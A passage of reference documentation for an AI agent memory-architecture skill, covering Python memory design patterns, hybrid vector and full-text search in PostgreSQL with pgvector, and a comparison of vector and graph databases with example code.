results[\"distances\"][0][i]\n            }\n            for i in range(len(results[\"documents\"][0]))\n        ]\n\nclass GraphMemoryRepository(MemoryRepository):\n    def __init__(self, graph_db):\n        self.graph_db = graph_db\n\n    def store(self, key: str, value: Any, metadata: Dict = None):\n        self.graph_db.create_node(key, value, metadata)\n\n    def retrieve(self, key: str) -> Optional[Any]:\n        node = self.graph_db.get_node(key)\n        return node if node else None\n\n    def search(self, query: str, filters: Dict = None) -> List[Dict]:\n        # Graph-based search implementation\n        pass\n\nclass UnifiedMemoryManager:\n    def __init__(self, repository: MemoryRepository):\n        self.repository = repository\n\n    def store_memory(self, key: str, value: Any, memory_type: str = \"general\"):\n        \"\"\"Store with type metadata\"\"\"\n        metadata = {\"type\": memory_type}\n        self.repository.store(key, value, metadata)\n\n    def get_memory(self, key: str) -> Optional[Any]:\n        \"\"\"Retrieve memory\"\"\"\n        result = self.repository.retrieve(key)\n        return result[\"value\"] if result else None\n\n    def search_memories(self, query: str, memory_type: str = None) -> List[Dict]:\n        \"\"\"Search memories\"\"\"\n        filters = {\"type\": memory_type} if memory_type else None\n        return self.repository.search(query, filters)\n```\n\n### Benefits\n- GOOD Implementation hiding\n- GOOD Easy to swap storage backends\n- GOOD Consistent interface\n- GOOD Testable architecture\n\n### Use When\n- Want to support multiple storage backends\n- Need to switch implementations\n- Testing with different storage types\n- Long-term flexibility required\n\n## Pattern 5: Memory Consolidation\n\n### Description\nPeriodically consolidate memories to maintain efficiency and remove redundancy.\n\n### Implementation\n```python\nclass MemoryConsolidator:\n    def __init__(self, memory_manager, consolidation_threshold: int = 100):\n        self.memory_manager = memory_manager\n        self.consolidation_threshold = consolidation_threshold\n        self.memory_count = 0\n\n    def maybe_consolidate(self):\n        \"\"\"Check if consolidation is needed\"\"\"\n        self.memory_count = self.memory_manager.count()\n\n        if self.memory_count >= self.consolidation_threshold:\n            self.consolidate()\n\n    def consolidate(self):\n        \"\"\"Perform memory consolidation\"\"\"\n        print(\"Starting memory consolidation...\")\n\n        # 1. Find similar memories\n        similar_groups = self._find_similar_memories()\n\n        # 2. Merge similar memories\n        merged_memories = []\n        for group in similar_groups:\n            merged = self._merge_memory_group(group)\n            merged_memories.append(merged)\n\n        # 3. Store merged memories\n        for merged in merged_memories:\n            self.memory_manager.store(\n                merged[\"key\"],\n                merged[\"content\"],\n                merged[\"metadata\"]\n            )\n\n        print(f\"Consolidated {len(similar_groups)} groups\")\n\n    def _find_similar_memories(self) -> List[List[dict]]:\n        \"\"\"Find groups of similar memories\"\"\"\n        all_memories = self.memory_manager.get_all_memories()\n\n        # Simplified clustering\n        groups = []\n        processed = set()\n\n        for memory in all_memories:\n            if memory[\"key\"] in processed:\n                continue\n\n            group = [memory]\n            processed.add(memory[\"key\"])\n\n            # Find similar memories\n            for other_memory in all_memories:\n                if other_memory[\"key\"] in processed:\n                    continue\n\n                similarity = self._calculate_similarity(memory, other_memory)\n                if similarity > 0.8:  # Threshold\n                    group.append(other_memory)\n                    processed.add(other_memory[\"key\"])\n\n            groups.append(group)\n\n        return groups\n\n    def _merge_memory_group(self, group: List[dict]) -> dict:\n        \"\"\"Merge a group of similar memories\"\"\"\n        # Combine content\n        combined_content = \"\\n\".join(m[\"content\"] for m in group)\n\n        # Merge metadata\n        combined_metadata = {\n            \"type\": group[0][\"metadata\"].get(\"type\", \"general\"),\n            \"merged_from\": [m[\"key\"] for m in group],\n            \"merge_timestamp\": datetime.now().isoformat(),\n            \"similarity_score\": self._calculate_group_similarity(group)\n        }\n\n        # Generate new key\n        new_key = f\"merged_{hash(combined_content) % 10000}\"\n\n        return {\n            \"key\": new_key,\n            \"content\": combined_content,\n            \"metadata\": combined_metadata\n        }\n\n    def _calculate_similarity(self, memory1: dict, memory2: dict) -> float:\n        \"\"\"Calculate similarity between two memories\"\"\"\n        # Simplified - use Jaccard similarity\n        set1 = set(memory1[\"content\"].split())\n        set2 = set(memory2[\"content\"].split())\n\n        intersection = len(set1 & set2)\n        union = len(set1 | set2)\n\n        return intersection / union if union > 0 else 0\n\n    def _calculate_group_similarity(self, group: List[dict]) -> float:\n        \"\"\"Calculate average similarity within group\"\"\"\n        similarities = []\n\n        for i in range(len(group)):\n            for j in range(i + 1, len(group)):\n                sim = self._calculate_similarity(group[i], group[j])\n                similarities.append(sim)\n\n        return sum(similarities) / len(similarities) if similarities else 0\n```\n\n### Benefits\n- GOOD Reduces memory footprint\n- GOOD Removes redundancy\n- GOOD Maintains efficiency\n- GOOD Improves retrieval quality\n\n### Use When\n- Memory is growing large\n- Redundancy is an issue\n- Storage costs are high\n- Retrieval is slowing down\n\n## Pattern 6: Memory Snapshot and Restore\n\n### Description\nCreate snapshots of memory state for backup, versioning, or state transfer.\n\n### Implementation\n```python\nclass MemorySnapshot:\n    def __init__(self, memories: List[dict], timestamp: datetime):\n        self.memories = memories\n        self.timestamp = timestamp\n        self.id = str(uuid.uuid4())\n\n    def to_dict(self) -> dict:\n        return {\n            \"id\": self.id,\n            \"timestamp\": self.timestamp.isoformat(),\n            \"memories\": self.memories\n        }\n\n    @classmethod\n    def from_dict(cls, data: dict) -> 'MemorySnapshot':\n        snapshot = cls(\n            memories=data[\"memories\"],\n            timestamp=datetime.fromisoformat(data[\"timestamp\"])\n        )\n        snapshot.id = data[\"id\"]\n        return snapshot\n\nclass MemorySnapshotManager:\n    def __init__(self, memory_manager):\n        self.memory_manager = memory_manager\n        self.snapshots = []\n\n    def create_snapshot(self, description: str = \"\") -> MemorySnapshot:\n        \"\"\"Create snapshot of current memory state\"\"\"\n        all_memories = self.memory_manager.get_all_memories()\n\n        snapshot = MemorySnapshot(\n            memories=all_memories,\n            timestamp=datetime.now()\n        )\n\n        snapshot.description = description\n        self.snapshots.append(snapshot)\n\n        return snapshot\n\n    def restore_snapshot(self, snapshot_id: str):\n        \"\"\"Restore memory from snapshot\"\"\"\n        snapshot = self._find_snapshot(snapshot_id)\n        if not snapshot:\n            raise ValueError(f\"Snapshot {snapshot_id} not found\")\n\n        # Clear current memory\n        self.memory_manager.clear()\n\n        # Restore from snapshot\n        for memory in snapshot.memories:\n            self.memory_manager.store(\n                memory[\"key\"],\n                memory[\"content\"],\n                memory[\"metadata\"]\n            )\n\n    def list_snapshots(self) -> List[dict]:\n        \"\"\"List all snapshots\"\"\"\n        return [\n            {\n                \"id\": s.id,\n                \"timestamp\": s.timestamp.isoformat(),\n                \"description\": s.description,\n                \"memory_count\": len(s.memories)\n            }\n            for s in self.snapshots\n        ]\n\n    def compare_snapshots(self, snapshot_id1: str, snapshot_id2: str) -> dict:\n        \"\"\"Compare two snapshots\"\"\"\n        s1 = self._find_snapshot(snapshot_id1)\n        s2 = self._find_snapshot(snapshot_id2)\n\n        memories1 = {m[\"key\"]: m for m in s1.memories}\n        memories2 = {m[\"key\"]: m for m in s2.memories}\n\n        added = set(memories2.keys()) - set(memories1.keys())\n        removed = set(memories1.keys()) - set(memories2.keys())\n        modified = []\n\n        for key in set(memories1.keys()) & set(memories2.keys()):\n            if memories1[key][\"content\"] != memories2[key][\"content\"]:\n                modified.append(key)\n\n        return {\n            \"added\": list(added),\n            \"removed\": list(removed),\n            \"modified\": modified\n        }\n```\n\n### Benefits\n- GOOD Backup and recovery\n- GOOD Version control\n- GOOD State transfer\n- GOOD Debugging assistance\n\n### Use When\n- Need to backup memory state\n- Want to version memory changes\n- Transferring memory between agents\n- Debugging memory issues\n\n## Pattern 7: Adaptive Memory\n\n### Description\nAutomatically adapt memory behavior based on usage patterns and performance.\n\n### Implementation\n```python\nclass AdaptiveMemoryManager:\n    def __init__(self, memory_manager):\n        self.memory_manager = memory_manager\n        self.usage_stats = defaultdict(int)\n        self.access_times = defaultdict(list)\n        self.performance_metrics = []\n\n    def store(self, key: str, value: Any, metadata: Dict = None):\n        \"\"\"Store with adaptive behavior\"\"\"\n        # Update usage stats\n        self.usage_stats[key] += 1\n\n        # Decide storage strategy based on usage\n        if self.usage_stats[key] > 100:\n            strategy = \"long_term_consolidation\"\n        elif self.usage_stats[key] > 10:\n            strategy = \"standard_storage\"\n        else:\n            strategy = \"short_term_cache\"\n\n        # Apply strategy\n        if strategy == \"long_term_consolidation\":\n            self._consolidate_similar_memories(key, value)\n        else:\n            self.memory_manager.store(key, value, metadata)\n\n    def retrieve(self, key: str) -> Optional[Any]:\n        \"\"\"Retrieve with adaptive caching\"\"\"\n        start_time = time.time()\n\n        result = self.memory_manager.retrieve(key)\n\n        access_time = time.time() - start_time\n        self.access_times[key].append(access_time)\n\n        # Track performance\n        if access_time > 0.1:  # Slow access\n            self._optimize_retrieval(key)\n\n        return result\n\n    def _consolidate_similar_memories(self, key: str, value: Any):\n        \"\"\"Consolidate if memory is heavily used\"\"\"\n        # Find similar memories\n        similar = self._find_similar_memories(key, value)\n\n        if len(similar) > 5:  # Threshold\n            # Consolidate into semantic memory\n            self.memory_manager.consolidate_to_semantic(key, value, similar)\n\n    def _optimize_retrieval(self, key: str):\n        \"\"\"Optimize retrieval for slow memories\"\"\"\n        # Create cache for frequently accessed slow memories\n        avg_access_time = sum(self.access_times[key]) / len(self.access_times[key])\n\n        if avg_access_time > 0.1:\n            self.memory_manager.create_cache(key)\n\n    def get_memory_health(self) -> dict:\n        \"\"\"Get overall memory system health\"\"\"\n        total_accesses = sum(self.usage_stats.values())\n        avg_access_time = sum(\n            sum(times) / len(times)\n            for times in self.access_times.values()\n        ) / len(self.access_times) if self.access_times else 0\n\n        return {\n            \"total_memories\": len(self.usage_stats),\n            \"total_accesses\": total_accesses,\n            \"average_access_time\": avg_access_time,\n            \"most_accessed\": max(self.usage_stats.items(), key=lambda x: x[1])\n        }\n```\n\n### Benefits\n- GOOD Self-optimizing\n- GOOD Adapts to usage patterns\n- GOOD Performance aware\n- GOOD Intelligent storage\n\n### Use When\n- Usage patterns vary widely\n- Performance is critical\n- Want automation\n- Resource-constrained environments\n\n## Pattern Selection Guide\n\n| Pattern | Best For | Complexity | Benefit |\n|---------|----------|------------|---------|\n| **Progressive Enhancement** | Uncertain requirements | Low | Incremental value |\n| **Layered Memory** | Complex systems | Medium | Separation of concerns |\n| **Observer Pattern** | Event-driven | Low | Decoupling |\n| **Repository Pattern** | Multiple backends | Medium | Abstraction |\n| **Memory Consolidation** | Large memory sets | Medium | Efficiency |\n| **Snapshot/Restore** | Backup/versioning | Low | Reliability |\n| **Adaptive Memory** | Variable usage | High | Performance |\n\n## Combining Patterns\n\nPatterns can be combined:\n\n```python\nclass AdvancedMemorySystem:\n    def __init__(self):\n        # Layered architecture\n        self.layers = LayeredMemory()\n\n        # With repository pattern\n        self.repository = UnifiedMemoryManager(VectorMemoryRepository())\n\n        # With observer pattern\n        self.observable = MemoryObservable()\n\n        # With consolidation\n        self.consolidator = MemoryConsolidator(self)\n\n        # With snapshots\n        self.snapshot_manager = MemorySnapshotManager(self)\n```\n\n## Best Practices\n\n### Do's\nGOOD Choose patterns based on actual needs\nGOOD Combine patterns thoughtfully\nGOOD Start with simple patterns\nGOOD Document pattern usage\nGOOD Test pattern interactions\n\n### Don'ts\nBAD Over-engineer with too many patterns\nBAD Mix incompatible patterns\nBAD Ignore pattern maintenance costs\nBAD Forget to test pattern combinations\nBAD Skip pattern documentation\n\n### Pattern Anti-Patterns\n- BAD Using all patterns at once\n- BAD Changing patterns frequently\n- BAD Not measuring pattern benefits\n- BAD Ignoring pattern maintenance\n- BAD Over-complicating simple needs\n",
        "plugins/sys-agents/skills/architecting-memory/references/postgresql-hybrid.md": "# PostgreSQL Hybrid Search with pgvector\n\n## Overview\n\nPostgreSQL with pgvector extension provides a complete solution for hybrid search, combining vector similarity and full-text search capabilities in a single database.\n\n## Setup\n\n### 1. Install pgvector\n\n```sql\n-- Enable extension\nCREATE EXTENSION IF NOT EXISTS vector;\n\n-- Verify installation\nSELECT * FROM pg_extension WHERE extname = 'vector';\n```\n\n### 2. Create Table with Vector and Full-Text Columns\n\n```sql\nCREATE TABLE documents (\n    id SERIAL PRIMARY KEY,\n    content TEXT NOT NULL,\n    embedding vector(1536),  -- OpenAI ada-002 dimension\n    search_vector tsvector,\n    metadata JSONB\n);\n\n-- Create indexes\nCREATE INDEX ON documents USING ivfflat (embedding vector_cosine_ops)\n    WITH (lists = 100);\n\nCREATE INDEX search_vector_idx ON documents USING GIN (search_vector);\n```\n\n### 3. Create Trigger for Full-Text Search Vector\n\n```sql\nCREATE FUNCTION update_search_vector() RETURNS trigger AS $$\nBEGIN\n    NEW.search_vector :=\n        setweight(to_tsvector('english', coalesce(NEW.content, '')), 'A');\n    RETURN NEW;\nEND\n$$ LANGUAGE plpgsql;\n\nCREATE TRIGGER trigger_update_search_vector\n    BEFORE INSERT OR UPDATE ON documents\n    FOR EACH ROW EXECUTE FUNCTION update_search_vector();\n```\n\n## Hybrid Search Query\n\n### RRF Implementation in SQL\n\n```sql\nWITH vector_search AS (\n    SELECT id, content,\n           1 / (1 + (embedding <=> $1)) AS vector_score,\n           ROW_NUMBER() OVER (ORDER BY embedding <=> $1) as vector_rank\n    FROM documents\n    ORDER BY embedding <=> $1\n    LIMIT 50\n),\nkeyword_search AS (\n    SELECT id, content,\n           ts_rank(search_vector, plainto_tsquery('english', $2)) AS keyword_score,\n           ROW_NUMBER() OVER (ORDER BY ts_rank(search_vector, plainto_tsquery('english', $2)) DESC) as keyword_rank\n    FROM documents\n    WHERE search_vector @@ plainto_tsquery('english', $2)\n    LIMIT 50\n),\nrrf_scores AS (\n    SELECT COALESCE(v.id, k.id) as id,\n           v.content,\n           v.vector_score,\n           k.keyword_score,\n           -- RRF formula\n           COALESCE(1.0 / (60 + v.vector_rank), 0) +\n           COALESCE(1.0 / (60 + k.keyword_rank), 0) as rrf_score\n    FROM vector_search v\n    FULL OUTER JOIN keyword_search k ON v.id = k.id\n)\nSELECT id, content, rrf_score,\n       vector_score,\n       keyword_score\nFROM rrf_scores\nORDER BY rrf_score DESC\nLIMIT 10;\n```\n\n### Linear Combination\n\n```sql\nWITH vector_search AS (\n    SELECT id, content,\n           1 / (1 + (embedding <=> $1)) AS vector_score\n    FROM documents\n    ORDER BY embedding <=> $1\n    LIMIT 50\n),\nkeyword_search AS (\n    SELECT id, content,\n           ts_rank(search_vector, plainto_tsquery('english', $2)) AS keyword_score\n    FROM documents\n    WHERE search_vector @@ plainto_tsquery('english', $2)\n    LIMIT 50\n)\nSELECT COALESCE(v.id, k.id) as id,\n       v.content,\n       -- Linear combination with alpha weight\n       ($3 * v.vector_score + (1 - $3) * k.keyword_score) as hybrid_score\nFROM vector_search v\nFULL OUTER JOIN keyword_search k ON v.id = k.id\nORDER BY hybrid_score DESC\nLIMIT 10;\n```\n\n## Cross-Encoder Reranking\n\n### Step 1: Get Candidates with SQL\n\n```sql\n-- Fetch top 100 candidates for reranking\nWITH candidates AS (\n    SELECT id, content\n    FROM documents\n    ORDER BY embedding <=> $1\n    LIMIT 100\n)\nSELECT * FROM candidates;\n```\n\n### Step 2: Rerank with Cross-Encoder\n\n```python\nimport psycopg2\nfrom sentence_transformers import CrossEncoder\n\n# Connect to PostgreSQL\nconn = psycopg2.connect(\"postgresql://user:pass@localhost/db\")\ncursor = conn.cursor()\n\n# Fetch query embedding\ncursor.execute(\"SELECT %s::vector\", (query_embedding,))\nquery_vec = cursor.fetchone()[0]\n\n# Get candidates\ncursor.execute(\"\"\"\n    SELECT id, content\n    FROM documents\n    ORDER BY embedding <=> %s\n    LIMIT 100\n\"\"\", (query_vec,))\ncandidates = cursor.fetchall()\n\n# Load cross-encoder model\nmodel = CrossEncoder('cross-encoder/ms-marco-MiniLM-L-6-v2')\n\n# Prepare query-document pairs\nquery = \"search query\"\npairs = [(query, content) for _, content in candidates]\n\n# Get reranked scores\nscores = model.predict(pairs)\n\n# Combine with IDs and rerank\nreranked = list(zip(candidates, scores))\nreranked.sort(key=lambda x: x[1], reverse=True)\n\n# Return top 10\nreturn reranked[:10]\n```\n\n## Performance Optimization\n\n### 1. Indexing Strategy\n\n```sql\n-- HNSW index for fast approximate search\nCREATE INDEX ON documents USING ivfflat (embedding vector_cosine_ops)\n    WITH (lists = 100);\n\n-- GIN index for full-text search\nCREATE INDEX search_vector_idx ON documents USING GIN (search_vector);\n```\n\n### 2. Query Optimization\n\n```sql\n-- Use parallel execution\nSET max_parallel_workers_per_gather = 4;\n\n-- Adjust work_mem for sorting\nSET work_mem = '256MB';\n\n-- Optimize vector search parameters\nSET ivfflat.probes = 10;  -- More probes = better accuracy, slower\n```\n\n### 3. Materialized Views for Common Queries\n\n```sql\nCREATE MATERIALIZED VIEW popular_docs AS\nSELECT id, content,\n       ts_rank(search_vector, plainto_tsquery('english', 'popular')) as popularity\nFROM documents\nWHERE search_vector @@ plainto_tsquery('english', 'popular');\n\n-- Refresh periodically\nREFRESH MATERIALIZED VIEW popular_docs;\n```\n\n## Complete Example\n\n### Python Implementation\n\n```python\nimport psycopg2\nimport numpy as np\nfrom typing import List, Tuple\n\nclass PostgreSQLHybridSearch:\n    def __init__(self, connection_string: str):\n        self.conn = psycopg2.connect(connection_string)\n        self.cursor = self.conn.cursor()\n\n    def hybrid_search(\n        self,\n        query_embedding: np.ndarray,\n        query_text: str,\n        method: str = 'rrf',\n        alpha: float = 0.5,\n        limit: int = 10\n    ) -> List[Tuple[int, str, float]]:\n        \"\"\"Perform hybrid search using RRF or linear combination.\"\"\"\n\n        if method == 'rrf':\n            return self._rrf_search(query_embedding, query_text, limit)\n        elif method == 'linear':\n            return self._linear_search(query_embedding, query_text, alpha, limit)\n        else:\n            raise ValueError(f\"Unknown method: {method}\")\n\n    def _rrf_search(\n        self,\n        query_embedding: np.ndarray,\n        query_text: str,\n        limit: int = 10\n    ) -> List[Tuple[int, str, float]]:\n        \"\"\"RRF hybrid search.\"\"\"\n\n        query = \"\"\"\n        WITH vector_search AS (\n            SELECT id, content,\n                   1 / (1 + (embedding <=> %s)) AS vector_score,\n                   ROW_NUMBER() OVER (ORDER BY embedding <=> %s) as vector_rank\n            FROM documents\n            ORDER BY embedding <=> %s\n            LIMIT 50\n        ),\n        keyword_search AS (\n            SELECT id, content,\n                   ts_rank(search_vector, plainto_tsquery('english', %s)) AS keyword_score,\n                   ROW_NUMBER() OVER (\n                       ORDER BY ts_rank(search_vector, plainto_tsquery('english', %s)) DESC\n                   ) as keyword_rank\n            FROM documents\n            WHERE search_vector @@ plainto_tsquery('english', %s)\n            LIMIT 50\n        ),\n        rrf_scores AS (\n            SELECT COALESCE(v.id, k.id) as id,\n                   v.content,\n                   COALESCE(1.0 / (60 + v.vector_rank), 0) +\n                   COALESCE(1.0 / (60 + k.keyword_rank), 0) as rrf_score\n            FROM vector_search v\n            FULL OUTER JOIN keyword_search k ON v.id = k.id\n        )\n        SELECT id, content, rrf_score\n        FROM rrf_scores\n        ORDER BY rrf_score DESC\n        LIMIT %s;\n        \"\"\"\n\n        self.cursor.execute(query, (\n            query_embedding, query_embedding, query_embedding,\n            query_text, query_text, query_text,\n            limit\n        ))\n\n        return self.cursor.fetchall()\n\n    def _linear_search(\n        self,\n        query_embedding: np.ndarray,\n        query_text: str,\n        alpha: float = 0.5,\n        limit: int = 10\n    ) -> List[Tuple[int, str, float]]:\n        \"\"\"Linear combination hybrid search.\"\"\"\n\n        query = \"\"\"\n        WITH vector_search AS (\n            SELECT id, content,\n                   1 / (1 + (embedding <=> %s)) AS vector_score\n            FROM documents\n            ORDER BY embedding <=> %s\n            LIMIT 50\n        ),\n        keyword_search AS (\n            SELECT id, content,\n                   ts_rank(search_vector, plainto_tsquery('english', %s)) AS keyword_score\n            FROM documents\n            WHERE search_vector @@ plainto_tsquery('english', %s)\n            LIMIT 50\n        )\n        SELECT COALESCE(v.id, k.id) as id,\n               COALESCE(v.content, k.content) as content,\n               (%s * v.vector_score + (1 - %s) * k.keyword_score) as hybrid_score\n        FROM vector_search v\n        FULL OUTER JOIN keyword_search k ON v.id = k.id\n        ORDER BY hybrid_score DESC\n        LIMIT %s;\n        \"\"\"\n\n        self.cursor.execute(query, (\n            query_embedding, query_embedding,\n            query_text, query_text,\n            alpha, alpha,\n            limit\n        ))\n\n        return self.cursor.fetchall()\n\n    def add_document(self, content: str, embedding: np.ndarray):\n        \"\"\"Add a document with embedding.\"\"\"\n\n        query = \"\"\"\n        INSERT INTO documents (content, embedding)\n        VALUES (%s, %s)\n        RETURNING id;\n        \"\"\"\n\n        self.cursor.execute(query, (content, embedding))\n        self.conn.commit()\n        return self.cursor.fetchone()[0]\n\n    def close(self):\n        \"\"\"Close database connection.\"\"\"\n        self.cursor.close()\n        self.conn.close()\n```\n\n## Advantages\n\n1. **Single database** - No need for multiple systems\n2. **ACID compliance** - Strong consistency guarantees\n3. **Rich SQL** - Expressive querying capabilities\n4. **Cost-effective** - Lower infrastructure costs\n5. **Mature ecosystem** - Extensive tooling and support\n\n## Considerations\n\n1. **Vector performance** - Not as fast as specialized vector databases\n2. **Scaling** - May need sharding for very large datasets\n3. **Memory usage** - Vector indexes consume significant RAM\n4. **Complexity** - Requires understanding of both vector and SQL\n\n## Best Practices\n\n1. **Choose right index type** - HNSW for accuracy, IVFFlat for speed\n2. **Tune probe count** - Balance accuracy and performance\n3. **Use prepared statements** - Prevent SQL injection\n4. **Monitor query performance** - Use EXPLAIN ANALYZE\n5. **Batch embeddings** - Insert documents in bulk\n6. **Cache frequent queries** - Reduce database load\n7. **Use connection pooling** - Improve throughput\n",
        "plugins/sys-agents/skills/architecting-memory/references/tech-stack.md": "# Technology Stack Options\n\nComparison of technologies for implementing memory systems.\n\n## Vector Databases\n\n### ChromaDB\n\n**Type:** Open source, Python/JavaScript\n**License:** Open source (Apache 2.0)\n\n#### Pros\n- GOOD Simple to use\n- GOOD Good Python integration\n- GOOD Lightweight\n- GOOD Active development\n- GOOD Good documentation\n\n#### Cons\n- BAD Less mature than other options\n- BAD Limited scalability\n- BAD Single-node only\n- BAD Fewer enterprise features\n\n#### Best For\n- Small to medium projects\n- Rapid prototyping\n- Python-heavy stacks\n- Budget-conscious deployments\n\n#### Example Usage\n```python\nimport chromadb\nfrom chromadb.config import Settings\n\nclient = chromadb.Client(Settings(\n    persist_directory=\"./chroma_db\",\n    anonymized_telemetry=False\n))\n\ncollection = client.create_collection(\n    name=\"documents\",\n    embedding_function=embedding_function\n)\n\n# Store\ncollection.add(\n    ids=[\"doc1\"],\n    documents=[\"Document content\"],\n    embeddings=[embedding]\n)\n\n# Retrieve\nresults = collection.query(\n    query_embeddings=[query_embedding],\n    n_results=5\n)\n```\n\n### Pinecone\n\n**Type:** Managed, scalable\n**License:** Proprietary\n\n#### Pros\n- GOOD Fully managed service\n- GOOD Excellent scalability\n- GOOD High performance\n- GOOD Enterprise features\n- GOOD Good SLAs\n- GOOD Multi-cloud support\n\n#### Cons\n- BAD Expensive for large volumes\n- BAD Vendor lock-in\n- BAD Less control\n- BAD Proprietary format\n\n#### Best For\n- Enterprise applications\n- High-scale deployments\n- Production systems\n- Teams without DevOps\n\n#### Example Usage\n```python\nimport pinecone\n\npinecone.init(\n    api_key=\"your-api-key\",\n    environment=\"us-west1-gcp\"\n)\n\nindex = pinecone.Index(\"memory-index\")\n\n# Store\nindex.upsert(vectors=[{\n    \"id\": \"doc1\",\n    \"values\": embedding,\n    \"metadata\": {\"text\": \"Document content\"}\n}])\n\n# Retrieve\nresults = index.query(\n    vector=query_embedding,\n    top_k=5,\n    include_metadata=True\n)\n```\n\n### Weaviate\n\n**Type:** Open source with managed option\n**License:** Open source (BSD)\n\n#### Pros\n- GOOD GraphQL interface\n- GOOD Built-in ML models\n- GOOD Good scalability\n- GOOD Open source with options\n- GOOD Strong community\n\n#### Cons\n- BAD Steeper learning curve\n- BAD Complex setup\n- BAD More configuration\n\n#### Best For\n- GraphQL-first applications\n- Built-in ML models needed\n- Open source preference\n- Complex querying needs\n\n#### Example Usage\n```python\nimport weaviate\n\nclient = weaviate.Client(\"http://localhost:8080\")\n\n# Define schema\nschema = {\n    \"classes\": [{\n        \"class\": \"Document\",\n        \"properties\": [{\n            \"name\": \"content\",\n            \"dataType\": [\"text\"]\n        }]\n    }]\n}\n\nclient.schema.create(schema)\n\n# Store\nclient.data_object.create(\n    data_object={\n        \"content\": \"Document content\"\n    },\n    class_name=\"Document\"\n)\n\n# Retrieve\nresult = client.query.get(\n    \"Document\",\n    [\"content\"]\n).with_near_text({\n    \"concepts\": [\"search query\"]\n}).with_limit(5).do()\n```\n\n### Pgvector\n\n**Type:** PostgreSQL extension\n**License:** Open source (PostgreSQL License)\n\n#### Pros\n- GOOD Works with existing PostgreSQL\n- GOOD SQL queries\n- GOOD ACID compliance\n- GOOD Good performance\n- GOOD Transaction support\n\n#### Cons\n- BAD Limited vector operations\n- BAD Requires SQL expertise\n- BAD PostgreSQL scaling limits\n\n#### Best For\n- Existing PostgreSQL stacks\n- Transaction requirements\n- SQL-based applications\n- Hybrid storage needs\n\n#### Example Usage\n```python\nimport psycopg2\n\n# Create extension\n# CREATE EXTENSION vector;\n\n# Create table\n# CREATE TABLE documents (\n#     id SERIAL PRIMARY KEY,\n#     content TEXT,\n#     embedding vector(1536)\n# );\n\n# Store\ncursor.execute(\"\"\"\n    INSERT INTO documents (content, embedding)\n    VALUES (%s, %s)\n\"\"\", (\"Document content\", embedding))\n\n# Retrieve\ncursor.execute(\"\"\"\n    SELECT content\n    FROM documents\n    ORDER BY embedding <-> %s\n    LIMIT 5\n\"\"\", (query_embedding,))\n```\n\n## Vector Database Comparison\n\n| Feature | ChromaDB | Pinecone | Weaviate | Pgvector |\n|---------|----------|-----------|----------|----------|\n| **Cost** | Free | High | Medium | Low |\n| **Scalability** | Low | High | Medium | Medium |\n| **Ease of Use** | High | High | Medium | Medium |\n| **Performance** | Medium | High | High | Medium |\n| **Managed Option** | No | Yes | Yes | No |\n| **Open Source** | Yes | No | Yes | Yes |\n| **Python Support** | Excellent | Excellent | Good | Good |\n| **Enterprise Features** | Limited | Excellent | Good | Good |\n\n## Knowledge Graphs\n\n### Neo4j\n\n**Type:** Graph database\n**License:** GPL (Community) / Commercial (Enterprise)\n\n#### Pros\n- GOOD Mature ecosystem\n- GOOD Excellent query language (Cypher)\n- GOOD Strong visualization tools\n- GOOD Good performance\n- GOOD Enterprise features\n\n#### Cons\n- BAD Expensive for commercial use\n- BAD Single-master replication\n- BAD ACID only in Enterprise\n- BAD Memory intensive\n\n#### Best For\n- Production graph applications\n- Complex relationship modeling\n- When Cypher is preferred\n- Enterprise deployments\n\n#### Example Usage\n```python\nfrom neo4j import GraphDatabase\n\ndriver = GraphDatabase.driver(\n    \"bolt://localhost:7687\",\n    auth=(\"user\", \"password\")\n)\n\n# Create nodes and relationships\nwith driver.session() as session:\n    session.run(\"\"\"\n        CREATE (e:Entity {name: $name, type: $type})\n    \"\"\", name=\"John Doe\", type=\"Person\")\n\n    session.run(\"\"\"\n        MATCH (a:Entity), (b:Entity)\n        WHERE a.name = $name1 AND b.name = $name2\n        CREATE (a)-[:RELATED_TO]->(b)\n    \"\"\", name1=\"John Doe\", name2=\"Jane Smith\")\n\n# Query\nwith driver.session() as session:\n    result = session.run(\"\"\"\n        MATCH (e:Entity)-[:RELATED_TO]->(related)\n        WHERE e.name = $name\n        RETURN e, related\n    \"\"\", name=\"John Doe\")\n\n    for record in result:\n        print(record[\"related\"][\"name\"])\n```\n\n### Amazon Neptune\n\n**Type:** Managed graph database\n**License:** Proprietary (AWS)\n\n#### Pros\n- GOOD Fully managed\n- GOOD High availability\n- GOOD Multiple query languages (Gremlin, SPARQL, openCypher)\n- GOOD Serverless option\n- GOOD AWS integration\n\n#### Cons\n- BAD Expensive\n- BAD Vendor lock-in\n- BAD Less control\n- BAD AWS-only\n\n#### Best For\n- AWS-native applications\n- Managed graph database needs\n- Multiple query language support\n- Serverless architectures\n\n### ArangoDB\n\n**Type:** Multi-model database\n**License:** Apache 2.0\n\n#### Pros\n- GOOD Multi-model (document + graph + key-value)\n- GOOD Good performance\n- GOOD ACID transactions\n- GOOD Foxx microservices\n- GOOD Open source\n\n#### Cons\n- BAD Less mature ecosystem\n- BAD Smaller community\n- BAD Steeper learning curve\n\n#### Best For\n- Multi-model needs\n- Document + graph combination\n- Microservices architecture\n- Open source preference\n\n### NetworkX\n\n**Type:** Python graph library\n**License:** BSD\n\n#### Pros\n- GOOD Python-native\n- GOOD Easy to use\n- GOOD Good for algorithms\n- GOOD Visualization tools\n- GOOD Open source\n\n#### Cons\n- BAD Not a database (in-memory only)\n- BAD Limited scalability\n- BAD No persistence\n- BAD Single-machine only\n\n#### Best For\n- Python prototypes\n- Algorithm development\n- Visualization\n- Small to medium graphs\n\n#### Example Usage\n```python\nimport networkx as nx\n\n# Create graph\nG = nx.Graph()\n\n# Add nodes\nG.add_node(\"John\", type=\"Person\")\nG.add_node(\"Jane\", type=\"Person\")\n\n# Add relationships\nG.add_edge(\"John\", \"Jane\", type=\"FRIENDS_WITH\")\n\n# Query\nfor neighbor in G.neighbors(\"John\"):\n    print(f\"John is connected to: {neighbor}\")\n\n# Find paths\npath = nx.shortest_path(G, \"John\", \"Jane\")\nprint(f\"Path: {path}\")\n```\n\n## Knowledge Graph Comparison\n\n| Feature | Neo4j | Neptune | ArangoDB | NetworkX |\n|---------|-------|---------|----------|----------|\n| **Type** | Native Graph | Managed Graph | Multi-Model | Library |\n| **Scalability** | Medium | High | Medium | Low |\n| **Query Language** | Cypher | Gremlin/SPARQL/Cypher | AQL | Python API |\n| **Persistence** | Yes | Yes | Yes | No |\n| **Transactions** | Enterprise only | Yes | Yes | No |\n| **Cost** | High | High | Medium | Free |\n| **Ease of Use** | High | Medium | Medium | High |\n| **Python Support** | Good | Good | Good | Excellent |\n\n## Embedding Models\n\n### OpenAI 